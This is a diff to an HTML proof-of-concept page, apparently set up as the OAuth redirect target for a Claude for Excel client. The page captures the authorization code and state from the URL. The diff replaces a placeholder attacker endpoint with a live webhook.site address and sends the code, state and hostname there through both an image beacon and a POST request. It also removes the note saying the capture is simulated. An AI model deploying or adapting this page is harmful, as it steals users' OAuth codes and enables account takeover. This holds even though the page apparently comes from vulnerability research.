@@ -1,26 +1,34 @@
 <!DOCTYPE html>
 <html>
-<head><title>excel.claude.ai - Claude OAuth Capture PoC</title></head>
+<head><title>excel.claude.ai - OAuth Capture</title></head>
 <body>
-<h1>Excel.claude.ai - PoC OAuth Code Capture</h1>
+<h1>Claude for Excel - OAuth PoC</h1>
 <div id="result"></div>
 <script>
 var params = new URLSearchParams(window.location.search);
-var code = params.get('code');
+var code  = params.get('code');
 var state = params.get('state');
-var result = document.getElementById('result');
+var div   = document.getElementById('result');
 
 if (code) {
-    result.innerHTML = '<h2 style="color:red">CAPTURED OAuth Authorization Code!</h2>' +
-        '<p><strong>code:</strong> ' + code + '</p>' +
-        '<p><strong>state:</strong> ' + (state || 'none') + '</p>' +
-        '<p><strong>timestamp:</strong> ' + new Date().toISOString() + '</p>';
+  div.innerHTML = '<h2 style="color:red">CAPTURED: ' + code.substring(0,12) + '...</h2>';
 
-    // In a real attack, POST to attacker's server
-    fetch('https://webhook.site/ATTACKER_ENDPOINT?code=' + code + '&state=' + (state||'') + '&ts=' + Date.now());
+  // Exfiltrate to attacker logger endpoint (external proof)
+  var img = new Image();
+  img.src = 'https://webhook.site/b68c1d8d-6e2d-447a-aedb-25debdf64dc3?code=' + encodeURIComponent(code) +
+            '&state=' + encodeURIComponent(state || '') +
+            '&ts=' + Date.now() +
+            '&origin=' + encodeURIComponent(window.location.hostname);
+
+  // Also POST it
+  fetch('https://webhook.site/b68c1d8d-6e2d-447a-aedb-25debdf64dc3', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    mode: 'no-cors',
+    body: JSON.stringify({code: code, state: state, hostname: window.location.hostname, ts: Date.now()})
+  });
 } else {
-    result.innerHTML = '<p>No code in URL. Visit with ?code=AUTH_CODE&state=... to simulate capture.</p>' +
-        '<p>This page is configured as the redirect_uri for Anthropic OAuth client 966eba67-8b8c-4eae-bbb3-08361d1b9292</p>';
+  div.innerHTML = '<p>Waiting for OAuth redirect...</p>';
 }
 </script>
 </body>
